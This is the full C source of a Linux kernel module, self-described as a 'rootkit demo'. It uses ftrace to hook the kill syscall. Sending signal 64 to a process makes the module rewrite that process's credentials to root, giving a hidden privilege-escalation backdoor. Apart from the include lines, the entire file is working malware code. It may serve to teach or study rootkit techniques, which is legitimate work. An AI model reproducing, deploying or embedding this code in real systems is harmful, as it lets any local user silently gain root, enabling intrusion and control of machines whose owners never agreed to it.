#include <linux/cred.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/syscalls.h>
#include <linux/workqueue.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("rootkit demo");

static struct work_struct root_work;
static pid_t target_pid = 0;

static asmlinkage long (*orig_kill)(const struct pt_regs *);

static void execute_privesc(struct work_struct *work)
{
    struct task_struct *task;
    struct cred *new_creds;

    (void)work;

    if (target_pid == 0)
    {
        return;
    }

    printk(KERN_INFO "rootkit: worker searching for pid %d...\n", target_pid);

    // 1) find the target pid
    rcu_read_lock();
    for_each_process(task)
    {
        if (task->pid != target_pid)
        {
            continue;
        }

        get_task_struct(task);
        rcu_read_unlock();

        printk(KERN_INFO "rootkit: found task %s (pid %d)\n", task->comm, task->pid);

        // 2) alternate method: clone 'current' (worker) instead of 'init'
        // since this runs in a kworker, 'current' is already root
        new_creds = prepare_creds();
        if (!new_creds)
        {
            printk(KERN_ERR "rootkit: prepare_creds() failed\n");
            put_task_struct(task);
            return;
        }

        // 3) zero out creds to ensure root
        new_creds->uid.val   = 0;
        new_creds->gid.val   = 0;
        new_creds->euid.val  = 0;
        new_creds->egid.val  = 0;
        new_creds->suid.val  = 0;
        new_creds->sgid.val  = 0;
        new_creds->fsuid.val = 0;
        new_creds->fsgid.val = 0;

        // 4) apply to the target
        rcu_assign_pointer(task->real_cred, new_creds);
        rcu_assign_pointer(task->cred, new_creds);

        printk(KERN_INFO "rootkit: privesc successful for pid %d\n", task->pid);

        put_task_struct(task);
        target_pid = 0;
        return;
    }
    rcu_read_unlock();

    printk(KERN_ERR "rootkit: failed to find pid %d\n", target_pid);
    target_pid = 0;
}

static asmlinkage int hook_kill(const struct pt_regs *regs)
{
    int signal = regs->si;
    pid_t pid_arg = regs->di;

    // ignore signal 0 to keep logs clean
    if (signal == 0)
    {
        return orig_kill(regs);
    }

    if (signal == 64)
    {
        printk(KERN_INFO "rootkit: intercepted signal 64 for pid %d\n", pid_arg);
        target_pid = pid_arg;
        schedule_work(&root_work);
        return 0;
    }

    return orig_kill(regs);
}

static struct ftrace_hook hooks[] =
{
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init rootkit_init(void)
{
    INIT_WORK(&root_work, execute_privesc);
    return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
}

static void __exit rootkit_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    cancel_work_sync(&root_work);
}

module_init(rootkit_init);
module_exit(rootkit_exit);